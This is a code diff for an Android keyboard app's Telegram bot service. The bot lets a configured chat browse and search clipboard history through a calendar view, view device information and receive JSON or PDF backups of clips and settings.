+                        + "[{\"text\":\"📄 Full Content\",\"callback_data\":\"cpc_" + calKey + "\"},"
+                        + "{\"text\":\"📌 Description\",\"callback_data\":\"dec_" + calKey + "\"}],"
+                        + "[{\"text\":\"🔙 Back to Date\",\"callback_data\":\"bk_cyd_"
+                        + year + "_" + month + "_" + day + "\"}]]}";
+                editOrSend(chatId, msgId, text, kb);
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-cal-clip").start();
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // /appbackup — exact same file as Settings backup (JSON or PDF)
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private void doAppBackupFormat(long chatId, int msgId) {
+        String text = "💾 <b>App Backup</b>\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                + "Choose the format for your backup file.\n\n"
+                + "📋 <b>JSON</b> — Full app backup (settings + all clips + learned words). "
+                + "Same file as the backup in ⚙ Settings → Backup.\n\n"
+                + "📄 <b>PDF</b> — Readable report (clipboard + smart clips).";
+        String kb = "{\"inline_keyboard\":["
+                + "[{\"text\":\"📋 JSON (Full Backup)\",\"callback_data\":\"bkj\"}],"
+                + "[{\"text\":\"📄 PDF (Readable Report)\",\"callback_data\":\"bkp\"}]]}";
+        editOrSend(chatId, msgId, text, kb);
+    }
+
+    private void doAppBackupJson(long chatId, int msgId) {
+        editOrSend(chatId, msgId, "⏳ <b>Generating full app backup…</b>\n<i>This is the same file as Settings → Backup.</i>", null);
+        new Thread(() -> {
+            try {
+                // Use BackupRestoreSystem — identical to what Settings backup produces
+                String json = BackupRestoreSystem.createBackupJson(this);
+                if (json == null || json.isEmpty()) {
+                    sendTo(chatId, "❌ Nothing to backup."); return;
+                }
+                String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+                File f = new File(getCacheDir(), "fullkeyboard_backup_" + date + ".json");
+                FileOutputStream fos = new FileOutputStream(f);
+                fos.write(json.getBytes("UTF-8"));
+                fos.close();
+                sendDoc(chatId, f, "💾 FullKeyboard Full Backup — " + date
+                        + "\n📋 Includes: settings, clipboard, smart clips, learned words");
+                f.delete();
+            } catch (Exception e) { sendTo(chatId, "❌ Backup error: " + e.getMessage()); }
+        }, "TG-backup-json").start();
+    }
+
+    private void doAppBackupPdf(long chatId, int msgId) {
+        editOrSend(chatId, msgId, "⏳ <b>Generating PDF report…</b>", null);
+        new Thread(() -> {
+            try {
+                File pdf = buildAllPdf();
+                if (pdf != null) {
+                    String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+                    sendDoc(chatId, pdf, "📄 FullKeyboard PDF Report — " + date);
+                    pdf.delete();
+                } else sendTo(chatId, "❌ No data found.");
+            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
+        }, "TG-backup-pdf").start();
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // Other commands
+    // ─────────────────────────────────────────────────────────────────────────
 
     private void cmdStatus(long chatId) {
         ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
@@ -361,77 +802,6 @@ public class TelegramBotService extends Service {
         }, "TG-all-pdf").start();
     }
 
-    private void doCalendar(long chatId, int monthOff) {
-        new Thread(() -> {
-            try {
-                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
-                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
-                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
-
-                Calendar cal = Calendar.getInstance();
-                cal.add(Calendar.MONTH, monthOff);
-                int year = cal.get(Calendar.YEAR), month = cal.get(Calendar.MONTH);
-                String monthName = new SimpleDateFormat("MMMM yyyy", Locale.getDefault()).format(cal.getTime());
-
-                Map<Integer, List<ClipboardHistoryService.HistoryEntry>> byDay = new TreeMap<>();
-                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
-                for (ClipboardHistoryService.HistoryEntry e : all) {
-                    try {
-                        Calendar ec = Calendar.getInstance();
-                        ec.setTime(sdf.parse(e.timestamp));
-                        if (ec.get(Calendar.YEAR) == year && ec.get(Calendar.MONTH) == month)
-                            byDay.computeIfAbsent(ec.get(Calendar.DAY_OF_MONTH), k -> new ArrayList<>()).add(e);
-                    } catch (Exception ignored) {}
-                }
-
-                StringBuilder sb = new StringBuilder();
-                sb.append("📅 <b>Clipboard Calendar — ").append(h(monthName)).append("</b>\n");
-                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
-
-                if (byDay.isEmpty()) {
-                    sb.append("<i>No clips this month.</i>");
-                } else {
-                    String mon = monthName.split(" ")[0];
-                    for (Map.Entry<Integer, List<ClipboardHistoryService.HistoryEntry>> en : byDay.entrySet()) {
-                        int cnt = en.getValue().size();
-                        sb.append("📆 <b>").append(mon).append(" ").append(en.getKey()).append("</b>");
-                        sb.append("  <i>(").append(cnt).append(cnt == 1 ? " clip" : " clips").append(")</i>\n");
-                        int show = Math.min(cnt, 3);
-                        for (int i = 0; i < show; i++) {
-                            String c = en.getValue().get(i).content;
-                            sb.append("  • <code>").append(h(c.length() > 80 ? c.substring(0, 80) + "…" : c)).append("</code>\n");
-                        }
-                        if (cnt > 3) sb.append("  <i>+ ").append(cnt - 3).append(" more…</i>\n");
-                        sb.append("\n");
-                    }
-                }
-
-                String markup = "{\"inline_keyboard\":[[{"
-                        + "\"text\":\"◀ " + prevMonth(monthOff) + "\","
-                        + "\"callback_data\":\"cal_" + (monthOff - 1) + "\"},{"
-                        + "\"text\":\"" + monthName + "\","
-                        + "\"callback_data\":\"cal_" + monthOff + "\"},{"
-                        + "\"text\":\"" + nextMonth(monthOff) + " ▶\","
-                        + "\"callback_data\":\"cal_" + (monthOff + 1) + "\"}]]}";
-                sendWithMarkup(chatId, sb.toString(), markup);
-            } catch (Exception e) { sendTo(chatId, "❌ Calendar error: " + e.getMessage()); }
-        }, "TG-cal").start();
-    }
-
-    private void doBackup(long chatId) {
-        sendTo(chatId, "⏳ Generating backup…");
-        new Thread(() -> {
-            try {
-                File f = buildJsonBackup();
-                if (f != null) {
-                    String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
-                    sendDoc(chatId, f, "💾 FullKeyboard Backup — " + date);
-                    f.delete();
-                } else sendTo(chatId, "❌ Nothing to backup.");
-            } catch (Exception e) { sendTo(chatId, "❌ Backup error: " + e.getMessage()); }
-        }, "TG-backup").start();
-    }
-
     private void cmdDevice(long chatId) {
         sendTo(chatId, "📱 <b>Device Information</b>\n\n"
                 + "📛 Model: <code>" + h(Build.MODEL) + "</code>\n"
@@ -445,43 +815,6 @@ public class TelegramBotService extends Service {
                 + "🌍 Locale: <code>" + h(Locale.getDefault().toString()) + "</code>\n"
                 + "💾 RAM: <code>" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB max</code>\n"
                 + "📊 ABI: <code>" + h(Arrays.toString(Build.SUPPORTED_ABIS)) + "</code>");
-    }
-
-    private void doRecent(long chatId, int page) {
-        new Thread(() -> {
-            try {
-                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
-                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
-                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
-                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
-
-                int pageSize = 20, total = all.size();
-                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
-                int pg = Math.max(1, Math.min(page, totalPages));
-                int from = (pg - 1) * pageSize, to = Math.min(from + pageSize, total);
-
-                StringBuilder sb = new StringBuilder();
-                sb.append("📋 <b>Recent Clips</b>  <i>Page ").append(pg).append(" / ").append(totalPages).append("</i>\n");
-                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
-
-                for (int i = from; i < to; i++) {
-                    ClipboardHistoryService.HistoryEntry e = all.get(i);
-                    String preview = e.content.length() > 100 ? e.content.substring(0, 100) + "…" : e.content;
-                    sb.append(i + 1).append(". ");
-                    if (e.pinned) sb.append("📍 ");
-                    sb.append("<code>").append(h(preview)).append("</code>\n");
-                    sb.append("   <i>").append(h(e.timestamp)).append("</i>\n\n");
-                }
-
-                List<String> btns = new ArrayList<>();
-                if (pg > 1) btns.add("{\"text\":\"◀ Prev\",\"callback_data\":\"recent_" + (pg - 1) + "\"}");
-                btns.add("{\"text\":\"📄 " + pg + "/" + totalPages + "\",\"callback_data\":\"recent_" + pg + "\"}");
-                if (pg < totalPages) btns.add("{\"text\":\"Next ▶\",\"callback_data\":\"recent_" + (pg + 1) + "\"}");
-                String markup = "{\"inline_keyboard\":[[" + String.join(",", btns) + "],"
-                        + "[{\"text\":\"🔍 Search Clips\",\"callback_data\":\"search\"}]]}";
-                sendWithMarkup(chatId, sb.toString(), markup);
-            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
-        }, "TG-recent").start();
     }
 
     private void promptSearch(long chatId) {
@@ -502,13 +835,13 @@ public class TelegramBotService extends Service {
                         hits.add(e);
 
                 if (hits.isEmpty()) {
-                    sendTo(chatId, "🔍 No results for <code>" + h(query) + "</code>.");
-                    return;
+                    sendTo(chatId, "🔍 No results for <code>" + h(query) + "</code>."); return;
                 }
 
                 StringBuilder sb = new StringBuilder();
-                sb.append("🔍 <b>Search: \"").append(h(query)).append("\"</b>  <i>").append(hits.size()).append(" found</i>\n");
-                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+                sb.append("🔍 <b>Search: \"").append(h(query)).append("\"</b>  <i>")
+                  .append(hits.size()).append(" found</i>\n")
+                  .append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 int shown = Math.min(hits.size(), 25);
                 for (int i = 0; i < shown; i++) {
                     ClipboardHistoryService.HistoryEntry e = hits.get(i);
@@ -516,6 +849,7 @@ public class TelegramBotService extends Service {
                     sb.append(i + 1).append(". ");
                     if (e.pinned) sb.append("📍 ");
                     sb.append("<code>").append(h(preview)).append("</code>\n");
+                    if (ok(e.description)) sb.append("   📌 <i>").append(h(e.description)).append("</i>\n");
                     sb.append("   <i>").append(h(e.timestamp)).append("</i>\n\n");
                 }
                 if (hits.size() > 25) sb.append("<i>… and ").append(hits.size() - 25).append(" more. Refine your query.</i>");
@@ -554,9 +888,9 @@ public class TelegramBotService extends Service {
         sendTo(chatId, "🔒 <b>Smart Clips locked.</b> Bot session cleared.");
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
     // PDF generation
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private File buildClipboardPdf() throws Exception {
         ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
@@ -586,8 +920,6 @@ public class TelegramBotService extends Service {
                            List<SmartClipsService.SmartClip> smartClips) throws Exception {
 
         final int W = 595, H = 842, M = 40;
-
-        // Paints
         Paint bgP    = paint(0xFFF0F4FF, 0, false);
         Paint hdrP   = paint(0xFF2D3A9A, 0, false);
         Paint cardP  = paint(0xFFFFFFFF, 12, true);
@@ -609,11 +941,7 @@ public class TelegramBotService extends Service {
         int pageNum = 1;
         PdfDocument.Page page = startPage(doc, pageNum, W, H);
         Canvas cv = page.getCanvas();
-
-        // Page background
         cv.drawRect(0, 0, W, H, bgP);
-
-        // Header banner
         cv.drawRect(0, 0, W, 95, hdrP);
         cv.drawText(title, M, 42, titleP);
         String meta = "Generated " + new SimpleDateFormat("dd MMM yyyy HH:mm", Locale.getDefault()).format(new Date());
@@ -621,15 +949,12 @@ public class TelegramBotService extends Service {
         if (smartClips != null && !smartClips.isEmpty()) meta += "  •  " + smartClips.size() + " smart clips";
         cv.drawText(meta, M, 62, subP);
         cv.drawText("FullKeyboard · SystemConsole  —  github.com/neet-ctrl/FullKeyboard-SystemConsole", M, 80, subP);
-
         float y = 110;
 
-        // ── Clipboard section ──────────────────────────────────────────────
         if (entries != null) {
             for (ClipboardHistoryService.HistoryEntry e : entries) {
                 int linesNeeded = Math.min(6, (int) Math.ceil(e.content.length() / 68.0));
                 float cardH = 16 + linesNeeded * 14f + 26;
-
                 if (y + cardH + 10 > H - M) {
                     doc.finishPage(page);
                     page = startPage(doc, ++pageNum, W, H);
@@ -637,12 +962,10 @@ public class TelegramBotService extends Service {
                     cv.drawRect(0, 0, W, H, bgP);
                     y = M;
                 }
-
                 float cW = W - 2 * M;
                 cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                 cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                 cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barCb);
-
                 float cx = M + 14, cy = y + 10;
                 cv.drawText("CLIPBOARD", cx, cy + 9, lblCb);
                 if (e.pinned) {
@@ -650,7 +973,6 @@ public class TelegramBotService extends Service {
                     cv.drawText("PINNED", cx + 84, cy + 9, pinTP);
                 }
                 cy += 16;
-
                 String txt = e.content.length() > 408 ? e.content.substring(0, 408) + "…" : e.content;
                 while (!txt.isEmpty() && cy < y + cardH - 14) {
                     int cut = Math.min(68, txt.length());
@@ -658,7 +980,6 @@ public class TelegramBotService extends Service {
                     txt = txt.substring(cut);
                     cy += 13;
                 }
-
                 String m2 = "🕐 " + e.timestamp + (ok(e.description) ? "   📌 " + e.description : "");
                 if (m2.length() > 90) m2 = m2.substring(0, 90);
                 cv.drawText(m2, cx, y + cardH - 5, metaP);
@@ -666,7 +987,6 @@ public class TelegramBotService extends Service {
             }
         }
 
-        // ── Smart Clips section ────────────────────────────────────────────
         if (smartClips != null && !smartClips.isEmpty()) {
             if (entries != null && !entries.isEmpty()) {
                 if (y + 40 > H - M) {
@@ -680,11 +1000,9 @@ public class TelegramBotService extends Service {
                 cv.drawText("  🔐  SMART CLIPS", M + 8, y + 21, secTP);
                 y += 42;
             }
-
             for (SmartClipsService.SmartClip sc : smartClips) {
                 int linesNeeded = Math.min(6, (int) Math.ceil(sc.content.length() / 68.0));
                 float cardH = 16 + linesNeeded * 14f + 30;
-
                 if (y + cardH + 10 > H - M) {
                     doc.finishPage(page);
                     page = startPage(doc, ++pageNum, W, H);
@@ -692,18 +1010,15 @@ public class TelegramBotService extends Service {
                     cv.drawRect(0, 0, W, H, bgP);
                     y = M;
                 }
-
                 float cW = W - 2 * M;
                 cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                 cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                 cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barSc);
-
                 float cx = M + 14, cy = y + 10;
                 cv.drawText("SMART CLIP  #" + sc.serial, cx, cy + 9, lblSc);
                 if (sc.locked) cv.drawText("🔒", cx + 130, cy + 9, metaP);
                 if (sc.hidden) cv.drawText("👁", cx + 148, cy + 9, metaP);
                 cy += 16;
-
                 String txt = sc.content.length() > 408 ? sc.content.substring(0, 408) + "…" : sc.content;
                 while (!txt.isEmpty() && cy < y + cardH - 18) {
                     int cut = Math.min(68, txt.length());
@@ -711,7 +1026,6 @@ public class TelegramBotService extends Service {
                     txt = txt.substring(cut);
                     cy += 13;
                 }
-
                 String m2 = "#" + sc.serial;
                 if (ok(sc.keyword))     m2 += "   🔑 " + sc.keyword;
                 if (ok(sc.description)) m2 += "   📌 " + sc.description;
@@ -735,59 +1049,9 @@ public class TelegramBotService extends Service {
         return doc.startPage(new PdfDocument.PageInfo.Builder(w, h, num).create());
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // JSON Backup
-    // ────────────────────────────────────────────────────────────────────────
-
-    private File buildJsonBackup() throws Exception {
-        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
-        SmartClipsService sc = SmartClipsService.getInstance(this);
-
-        JSONObject root = new JSONObject();
-        root.put("schema_version", 1);
-        root.put("app", "FullKeyboard-SystemConsole");
-        root.put("package", getPackageName());
-        root.put("exported_at", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault()).format(new Date()));
-        root.put("device_model", Build.MANUFACTURER + " " + Build.MODEL);
-        root.put("android_version", Build.VERSION.RELEASE);
-
-        JSONArray cbArr = new JSONArray();
-        if (cb != null) {
-            for (ClipboardHistoryService.HistoryEntry e : cb.get_history_entries()) {
-                JSONObject o = new JSONObject();
-                o.put("content", e.content);
-                o.put("timestamp", e.timestamp);
-                o.put("description", e.description != null ? e.description : "");
-                o.put("pinned", e.pinned);
-                cbArr.put(o);
-            }
-        }
-        root.put("clipboard_history", cbArr);
-
-        JSONArray scArr = new JSONArray();
-        for (SmartClipsService.SmartClip clip : sc.getClipsForWidget()) {
-            JSONObject o = new JSONObject();
-            o.put("serial", clip.serial);
-            o.put("content", clip.content);
-            o.put("description", clip.description != null ? clip.description : "");
-            o.put("keyword", clip.keyword != null ? clip.keyword : "");
-            o.put("hidden", clip.hidden);
-            o.put("locked", clip.locked);
-            o.put("timestamp", clip.timestamp != null ? clip.timestamp : "");
-            scArr.put(o);
-        }
-        root.put("smart_clips", scArr);
-
-        File f = new File(getCacheDir(), "fullkeyboard_backup_" + System.currentTimeMillis() + ".json");
-        FileOutputStream fos = new FileOutputStream(f);
-        fos.write(root.toString(2).getBytes("UTF-8"));
-        fos.close();
-        return f;
-    }
-
-    // ────────────────────────────────────────────────────────────────────────
-    // Auto-restart via AlarmManager
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    // Auto-restart
+    // ─────────────────────────────────────────────────────────────────────────
 
     public static void scheduleRestart(Context ctx) {
         Intent i = new Intent(ctx, TelegramBotService.class);
@@ -797,17 +1061,41 @@ public class TelegramBotService extends Service {
         if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60_000L, pi);
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
     // Telegram HTTP helpers
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private static String apiUrl(String token) {
         return "https://api.telegram.org/bot" + token;
     }
 
-    private void send(String text) {
-        sendTo(getChatId(this), text);
+    /** Send new message or edit existing one, depending on whether msgId > 0. */
+    private void editOrSend(long chatId, int msgId, String text, String markup) {
+        try {
+            if (msgId > 0) {
+                editMessage(chatId, msgId, text, markup);
+            } else {
+                sendWithMarkup(chatId, text, markup);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "editOrSend: " + e.getMessage());
+        }
     }
+
+    private void editMessage(long chatId, int msgId, String text, String markup) {
+        try {
+            StringBuilder body = new StringBuilder();
+            body.append("{\"chat_id\":").append(chatId)
+                .append(",\"message_id\":").append(msgId)
+                .append(",\"text\":").append(jstr(text))
+                .append(",\"parse_mode\":\"HTML\"");
+            if (markup != null) body.append(",\"reply_markup\":").append(markup);
+            body.append("}");
+            postJson(apiUrl(getToken(this)) + "/editMessageText", body.toString());
+        } catch (Exception e) { Log.w(TAG, "editMessage: " + e.getMessage()); }
+    }
+
+    private void send(String text) { sendTo(getChatId(this), text); }
 
     private void sendTo(long chatId, String text) {
         try {
@@ -820,11 +1108,13 @@ public class TelegramBotService extends Service {
 
     private void sendWithMarkup(long chatId, String text, String markup) {
         try {
-            String body = "{\"chat_id\":" + chatId
-                    + ",\"text\":" + jstr(text)
-                    + ",\"parse_mode\":\"HTML\""
-                    + ",\"reply_markup\":" + markup + "}";
-            postJson(apiUrl(getToken(this)) + "/sendMessage", body);
+            StringBuilder body = new StringBuilder();
+            body.append("{\"chat_id\":").append(chatId)
+                .append(",\"text\":").append(jstr(text))
+                .append(",\"parse_mode\":\"HTML\"");
+            if (markup != null) body.append(",\"reply_markup\":").append(markup);
+            body.append("}");
+            postJson(apiUrl(getToken(this)) + "/sendMessage", body.toString());
         } catch (Exception e) { Log.w(TAG, "sendWithMarkup: " + e.getMessage()); }
     }
 
@@ -896,55 +1186,121 @@ public class TelegramBotService extends Service {
         c.getResponseCode(); c.disconnect();
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    // Calendar helper utilities
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private List<ClipboardHistoryService.HistoryEntry> getClipsForDay(
+            List<ClipboardHistoryService.HistoryEntry> all, int year, int month, int day) {
+        List<ClipboardHistoryService.HistoryEntry> result = new ArrayList<>();
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+        for (ClipboardHistoryService.HistoryEntry e : all) {
+            try {
+                Calendar c = Calendar.getInstance();
+                c.setTime(sdf.parse(e.timestamp));
+                if (c.get(Calendar.YEAR) == year
+                        && (c.get(Calendar.MONTH) + 1) == month
+                        && c.get(Calendar.DAY_OF_MONTH) == day)
+                    result.add(e);
+            } catch (Exception ignored) {}
+        }
+        result.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
+        return result;
+    }
+
+    private long countClipsForYear(List<ClipboardHistoryService.HistoryEntry> all, int year) {
+        long count = 0;
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+        for (ClipboardHistoryService.HistoryEntry e : all) {
+            try {
+                Calendar c = Calendar.getInstance();
+                c.setTime(sdf.parse(e.timestamp));
+                if (c.get(Calendar.YEAR) == year) count++;
+            } catch (Exception ignored) {}
+        }
+        return count;
+    }
+
+    /** Build a single-button inline keyboard for a back action. */
+    private static String backKb(String callbackData, String label) {
+        return "{\"inline_keyboard\":[[{\"text\":" + jstr(label) + ",\"callback_data\":\"" + callbackData + "\"}]]}";
+    }
+
+    /** Create a short, readable label for a clip button (max ~35 chars). */
+    private static String clipLabel(String content, boolean pinned) {
+        String stripped = content.replaceAll("\\s+", " ").trim();
+        String prefix = pinned ? "📍 " : "";
+        if (stripped.length() > 35) stripped = stripped.substring(0, 34) + "…";
+        return prefix + stripped;
+    }
+
+    /** Parse "Y_M_D_I" calendar key into int[4]. */
+    private static int[] parseCalKey(String s) {
+        String[] p = s.split("_", 4);
+        int[] v = new int[4];
+        for (int i = 0; i < 4 && i < p.length; i++) {
+            try { v[i] = Integer.parseInt(p[i]); } catch (Exception e) { v[i] = 0; }
+        }
+        return v;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
     // Paint / text factory helpers
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private static Paint paint(int color, float radius, boolean antialias) {
-        Paint p = new Paint(); p.setColor(color); p.setAntiAlias(antialias);
-        return p;
+        Paint p = new Paint(); p.setColor(color); p.setAntiAlias(antialias); return p;
     }
     private static Paint stroke(int color, float width) {
-        Paint p = new Paint(); p.setColor(color); p.setStrokeWidth(width); p.setStyle(Paint.Style.STROKE); p.setAntiAlias(true);
-        return p;
+        Paint p = new Paint(); p.setColor(color); p.setStrokeWidth(width);
+        p.setStyle(Paint.Style.STROKE); p.setAntiAlias(true); return p;
     }
     private static Paint text(int color, float sp, boolean bold) {
         Paint p = new Paint(); p.setColor(color); p.setTextSize(sp); p.setAntiAlias(true);
-        if (bold) p.setFakeBoldText(true);
-        return p;
+        if (bold) p.setFakeBoldText(true); return p;
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // String utilities
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    // String / JSON utilities
+    // ─────────────────────────────────────────────────────────────────────────
 
-    private static String h(String s) {
+    static String h(String s) {
         if (s == null) return "";
         return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
     }
 
-    private static boolean ok(String s) { return s != null && !s.isEmpty(); }
-
-    private static String jstr(String s) {
-        if (s == null) s = "";
-        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"")
-                       .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\"";
+    static String jstr(String s) {
+        if (s == null) return "\"\"";
+        StringBuilder sb = new StringBuilder("\"");
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            switch (c) {
+                case '"':  sb.append("\\\""); break;
+                case '\\': sb.append("\\\\"); break;
+                case '\n': sb.append("\\n");  break;
+                case '\r': sb.append("\\r");  break;
+                case '\t': sb.append("\\t");  break;
+                default:
+                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
+                    else sb.append(c);
+            }
+        }
+        sb.append("\"");
+        return sb.toString();
     }
 
-    private static int parseInt(String s, int def) {
+    static boolean ok(String s) { return s != null && !s.isEmpty(); }
+
+    static int parseInt(String s, int def) {
         try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
     }
 
-    private static void sleep(long ms) {
-        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
+    static int p2i(String[] arr, int idx) {
+        if (arr == null || idx >= arr.length) return 0;
+        return parseInt(arr[idx], 0);
     }
 
-    private String prevMonth(int off) {
-        Calendar c = Calendar.getInstance(); c.add(Calendar.MONTH, off - 1);
-        return new SimpleDateFormat("MMM", Locale.getDefault()).format(c.getTime());
-    }
-    private String nextMonth(int off) {
-        Calendar c = Calendar.getInstance(); c.add(Calendar.MONTH, off + 1);
-        return new SimpleDateFormat("MMM", Locale.getDefault()).format(c.getTime());
+    static void sleep(long ms) {
+        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
     }
 }
